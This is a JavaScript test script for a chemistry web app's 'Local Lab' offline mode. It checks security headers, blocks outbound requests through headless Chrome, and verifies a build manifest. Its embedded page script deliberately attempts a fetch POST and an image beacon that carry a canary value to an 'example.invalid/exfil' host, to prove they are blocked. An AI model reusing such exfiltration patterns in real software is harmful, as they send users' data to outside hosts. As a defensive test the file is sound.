import { mkdtemp, rm } from 'node:fs/promises';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { startLocalTestServer } from './scripts/local-test-server.mjs';

const seed = Math.floor(Math.random() * 1000);
const appPort = Number(Bun.env.MOLARIUM_LOCAL_TEST_PORT) || 0;
const debugPort = Number(Bun.env.MOLARIUM_LOCAL_TEST_DEBUG_PORT) || 58000 + seed;
let appUrl, appOrigin;
const chromePath = Bun.env.CHROME_PATH || (process.platform === 'darwin'
  ? '/Applications/Google Chrome.app/Contents/MacOS/Google Chrome'
  : '/usr/bin/google-chrome');
const profile = await mkdtemp(join(tmpdir(), 'molarium-local-lab-test-'));
const canary = 'MOLARIUM_PROPRIETARY_CANARY_1fc1e8f9';
let server;
let chrome;

const delay = (milliseconds) => new Promise((resolve) => setTimeout(resolve, milliseconds));
async function waitFor(check, timeout = 20_000) {
  const start = Date.now();
  while (Date.now() - start < timeout) {
    try { const value = await check(); if (value) return value; } catch { /* startup retry */ }
    await delay(100);
  }
  throw new Error('Timed out waiting for Local Lab browser test');
}

class DevToolsClient {
  constructor(url) {
    this.socket = new WebSocket(url);
    this.nextId = 1;
    this.pending = new Map();
    this.listeners = new Map();
  }
  async open() {
    await new Promise((resolve, reject) => {
      this.socket.addEventListener('open', resolve, { once:true });
      this.socket.addEventListener('error', reject, { once:true });
    });
    this.socket.addEventListener('message', (event) => {
      const message = JSON.parse(event.data);
      if (message.id) {
        const pending = this.pending.get(message.id);
        if (!pending) return;
        this.pending.delete(message.id);
        if (message.error) pending.reject(new Error(message.error.message));
        else pending.resolve(message.result);
        return;
      }
      (this.listeners.get(message.method) || []).forEach((listener) => listener(message.params));
    });
  }
  on(method, listener) {
    const listeners = this.listeners.get(method) || [];
    listeners.push(listener);
    this.listeners.set(method, listeners);
  }
  call(method, params = {}) {
    const id = this.nextId++;
    return new Promise((resolve, reject) => {
      this.pending.set(id, { resolve, reject });
      this.socket.send(JSON.stringify({ id, method, params }));
    });
  }
  close() { this.socket.close(); }
}

try {
  const started = await startLocalTestServer({root:import.meta.dir,port:appPort,
    args:['--local-only','--test-api']});
  server = started.process;
  appUrl = started.baseUrl;
  appOrigin = new URL(appUrl).origin;
  const documentResponse = await waitFor(async () => {
    const response = await fetch(appUrl);
    return response.ok ? response : null;
  });
  const csp = documentResponse.headers.get('content-security-policy') || '';
  const serverPolicy = documentResponse.headers.get('x-molarium-network-policy');
  if (serverPolicy !== 'local-only-v1') throw new Error(`Unexpected server policy ${serverPolicy}`);
  for (const directive of ["connect-src 'self'", "form-action 'none'", "frame-src 'none'", "img-src 'self' data: blob:"])
    if (!csp.includes(directive)) throw new Error(`Local Lab CSP is missing ${directive}`);
  const missingResponse = await fetch(`${appUrl}definitely-not-a-real-local-asset`);
  if (missingResponse.status !== 404
      || missingResponse.headers.get('x-molarium-network-policy') !== 'local-only-v1'
      || !missingResponse.headers.get('content-security-policy')?.includes("connect-src 'self'"))
    throw new Error('Local Lab policy headers must also cover error responses');

  chrome = Bun.spawn([
    chromePath, '--headless', '--disable-extensions', '--no-first-run',
    ...(process.platform === 'linux' ? ['--no-sandbox','--disable-dev-shm-usage'] : []),
    `--remote-debugging-port=${debugPort}`, `--user-data-dir=${profile}`,
    '--window-size=1400,1000', 'about:blank',
  ], { stdout:'ignore', stderr:'ignore' });
  const page = await waitFor(async () => {
    const pages = await (await fetch(`http://127.0.0.1:${debugPort}/json`)).json();
    return pages.find((entry) => entry.type === 'page');
  });
  const client = new DevToolsClient(page.webSocketDebuggerUrl);
  await client.open();
  await client.call('Page.enable');
  await client.call('Runtime.enable');
  await client.call('Fetch.enable', { patterns:[{ urlPattern:'*', requestStage:'Request' }] });

  const externalAttempts = [];
  client.on('Fetch.requestPaused', ({ requestId, request }) => {
    let external = false;
    try {
      const url = new URL(request.url);
      external = ['http:', 'https:'].includes(url.protocol) && url.origin !== appOrigin;
    } catch { /* non-network URL */ }
    if (external) {
      externalAttempts.push({ url:request.url, method:request.method,
        containsCanary:request.url.includes(canary) || request.postData?.includes(canary) });
      client.call('Fetch.failRequest', { requestId, errorReason:'BlockedByClient' }).catch(() => {});
    } else client.call('Fetch.continueRequest', { requestId }).catch(() => {});
  });

  await client.call('Page.navigate', { url:appUrl });
  await waitFor(async () => {
    const response = await client.call('Runtime.evaluate', {
      expression:'document.readyState === "complete" && Boolean(window.molariumTest)', returnByValue:true,
    });
    return response.result.value;
  }, 30_000);

  const reportExpression = `(async () => {
    const checks = [];
    const check = (condition, label) => checks.push({ passed:Boolean(condition), label });
    const violations = [];
    addEventListener('securitypolicyviolation', (event) => violations.push({
      directive:event.effectiveDirective, blocked:event.blockedURI,
    }));
    check(globalThis.MOLARIUM_RUNTIME_CONFIG?.localOnly === true, 'runtime config is Local Lab');
    check(document.documentElement.dataset.networkMode === 'local-lab', 'document exposes local-lab state');
    check(document.querySelector('#network-policy-button')?.classList.contains('local-lab'), 'header shows network lock');
    check(document.querySelector('#msa-endpoint')?.disabled, 'MSA endpoint is disabled');
    check(document.querySelector('#fold-protein')?.disabled, 'MSA submission is disabled');
    check(document.querySelector('#preparation-ligands')?.value === 'exclude'
      && document.querySelector('#preparation-ligands option[value="ccd"]')?.disabled,
      'external CCD preparation is disabled');
    window.molariumTest.load('CCO');
    const localEnergy = await window.molariumTest.calculateCurrent('energy', 'rdkit');
    check(Number.isFinite(localEnergy.finalEnergy) && localEnergy.backend === 'RDKit',
      'same-origin RDKit WASM calculation still runs under the lock');
    let fetchBlocked = false;
    try {
      await fetch('https://example.invalid/exfil?value=${canary}', {
        method:'POST', body:'coordinates=${canary}', mode:'no-cors',
      });
    } catch { fetchBlocked = true; }
    check(fetchBlocked, 'CSP blocks an external fetch carrying the canary');
    const imageBlocked = await new Promise((resolve) => {
      const image = new Image();
      image.onload = () => resolve(false); image.onerror = () => resolve(true);
      image.src = 'https://example.invalid/pixel?value=${canary}';
    });
    check(imageBlocked, 'CSP blocks an external image beacon carrying the canary');
    await new Promise((resolve) => setTimeout(resolve, 100));
    check(violations.some((entry) => entry.directive === 'connect-src'), 'browser reports connect-src enforcement');
    check(violations.some((entry) => entry.directive === 'img-src'), 'browser reports img-src enforcement');
    document.querySelector('#network-policy-button').click();
    // The visible control dispatches an asynchronous public Chemist Action.
    // Observe its completion instead of checking the same click-task tick.
    const privacyStarted = Date.now();
    while (!document.querySelector('#project-info-dialog').open
      && Date.now() - privacyStarted < 10_000)
      await new Promise((resolve) => setTimeout(resolve, 20));
    check(document.querySelector('#project-info-dialog').open
      && !document.querySelector('[data-project-section="privacy"]').classList.contains('hidden'),
      'privacy panel explains the active policy');
    document.querySelector('#verify-local-build').click();
    const started = Date.now();
    while (!document.querySelector('#network-verification-result').classList.contains('success')
      && !document.querySelector('#network-verification-result').classList.contains('failure')) {
      if (Date.now() - started > 30_000) break;
      await new Promise((resolve) => setTimeout(resolve, 100));
    }
    const verification = document.querySelector('#network-verification-result');
    check(verification.classList.contains('success'),
      'loaded application matches the SHA-256 manifest');
    const resources = performance.getEntriesByType('resource')
      .filter((entry) => /^https?:/.test(entry.name))
      .map((entry) => ({ name:entry.name, transferSize:entry.transferSize,
        decodedBodySize:entry.decodedBodySize, responseStatus:entry.responseStatus || 0 }));
    const externalResponses = resources.filter((entry) => new URL(entry.name).origin !== location.origin
      && (entry.transferSize > 0 || entry.decodedBodySize > 0 || entry.responseStatus > 0));
    check(externalResponses.length === 0, 'no external HTTP response reached the page');
    return { checks, violations, resources, externalResponses, verification:verification.textContent };
  })()`;
  const evaluation = await client.call('Runtime.evaluate', {
    expression:reportExpression, awaitPromise:true, returnByValue:true,
  });
  if (evaluation.exceptionDetails)
    throw new Error(evaluation.exceptionDetails.exception?.description || evaluation.exceptionDetails.text);
  const report = evaluation.result.value;
  const failures = report.checks.filter((check) => !check.passed);
  if (externalAttempts.length) failures.push({ label:`${externalAttempts.length} external request(s) reached interception` });
  if (externalAttempts.some((attempt) => attempt.containsCanary))
    failures.push({ label:'the proprietary-data canary reached an outbound network request' });
  failures.forEach((failure) => console.error(`FAIL ${failure.label}`));
  console.log(`${report.checks.length - report.checks.filter((check) => !check.passed).length}/${report.checks.length} Local Lab checks passed`);
  console.log(`Browser CSP violations observed: ${report.violations.map((entry) => entry.directive).join(', ')}`);
  console.log(`External requests reaching the pre-network interceptor: ${externalAttempts.length}`);
  if (!report.verification.startsWith('Verified')) console.log(`Build verifier: ${report.verification}`);
  if (report.externalResponses.length) console.log(`External responses: ${JSON.stringify(report.externalResponses)}`);
  client.close();
  if (failures.length) process.exitCode = 1;
} finally {
  chrome?.kill();
  server?.kill();
  await Promise.allSettled([chrome?.exited, server?.exited]);
  await rm(profile, { recursive:true, force:true });
}
